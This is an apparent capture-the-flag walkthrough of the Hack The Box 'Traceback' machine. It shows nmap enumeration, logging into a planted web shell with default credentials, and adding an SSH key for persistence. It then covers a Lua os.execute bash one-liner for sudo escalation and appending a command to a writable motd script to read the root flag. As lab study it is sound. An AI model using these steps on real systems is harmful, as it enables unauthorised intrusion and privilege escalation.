## Hack The Box - Tracback

### This is my writeup and walkthrough for Traceback from Hack The Box.


![main](https://user-images.githubusercontent.com/36403473/90196696-cd8f2a00-ddcc-11ea-9f4f-5c0f9ca9ba3d.jpg)



### It was an easy machine from *Hack The Box*

## `Enumeration`

#### 1-Nmap 
  `nmap -sC -sV 10.10.10.181`

``` 
nmap -sC -sV 10.10.10.181
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-14 01:20 EET
Nmap scan report for 10.10.10.181
Host is up (0.41s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 103K  2020-02-27 05:37  smevk.php
|_
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Index of /
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
I found http on port 80 and ssh on port 22.
use should have password to conncet server so lets see http 
i opend source code i found this comment 
`
		<!--Some of the best web shells that you might need ;)-->`

![Screenshot from 2020-05-07 17-49-56](https://user-images.githubusercontent.com/36403473/81316540-feecb100-908b-11ea-94d2-a4b602e0a7b6.png)
 the first thing i do i bruteforce http dircetory by Wfuzz but it take much time , i googled on this comment i found differnt web shells on :
https://github.com/TheBinitGhimire/Web-Shells" 
reading smevk.php
we can login http://10.10.10.181/smevk.php
username:**admin**
password:**admin**

now lets go to this  directory  **/home/webadmin/.ssh** 
![Screenshot from 2020-05-07 18-23-38](https://user-images.githubusercontent.com/36403473/81319780-745a8080-9090-11ea-800a-f18601cdc38f.png)
i could to upload ssh autherizeed key 
to generate ssh keys  
i used  **`ssh-keygen`** tool on linux 
![sshgenerat](https://user-images.githubusercontent.com/36403473/81320041-da470800-9090-11ea-93d7-6956bc5bfdc0.png)

### 2-user access 

so now lets try to login to server:
**`ssh-i id_rsa webadmin@10.10.10.181`**

![echo_note](https://user-images.githubusercontent.com/36403473/81354623-61fe3800-90cc-11ea-8ccc-92a912176868.png)
two files was the solution to take user acess **note.txt** & **bash-history**
okey the olny thing we will do write simple lua script and save it on file
**echo 'os.execute(" /bin/bash -i ")' >>block.lua ** 
save it on **block.lua file**

![note script](https://user-images.githubusercontent.com/36403473/81354540-2cf1e580-90cc-11ea-8b80-ff368637bbfb.png)
 okey lets try to acess sysadmin  by block.lua
` sudo -u sysadmin /home/sysadmin/luvit block.lua
`
 go back to home directory 
![acces_system_admin](https://user-images.githubusercontent.com/36403473/81355358-983cb700-90ce-11ea-8a26-2eec59305606.png)
  
now i have access on sysadmin 
checking files `ls -al `

![acces_system_admin](https://user-images.githubusercontent.com/36403473/81357137-287cfb00-90d3-11ea-874e-160c7a63cca7.png)

now i have user access `user.txt`
### 3-root access
lets try to get root access, so i searched all files i didnt get any thing. 
after googling much time to get root access i use **`ps -aux`** commmnd  to provide information about the currently running processes.
i notice that there was an operation happened in this directory **`/etc/update-motd.d/`**
going to this directory ckeck all details **`ls -al`**
![not2root](https://user-images.githubusercontent.com/36403473/81357368-ba850380-90d3-11ea-9e74-9ceedefe51cc.png)
after googling i discovred bug in  The file `/etc/update-motd.d/00-header` according to this   [/etc/update-motd.d/00-header is broken](https://bugs.launchpad.net/ubuntu/+source/base-files/+bug/510599).

so lets
`echo "cat root/root.txt " >> 00-header`
then login again to server i try many time to login 
at the end the root flag printed on the welcome screen 
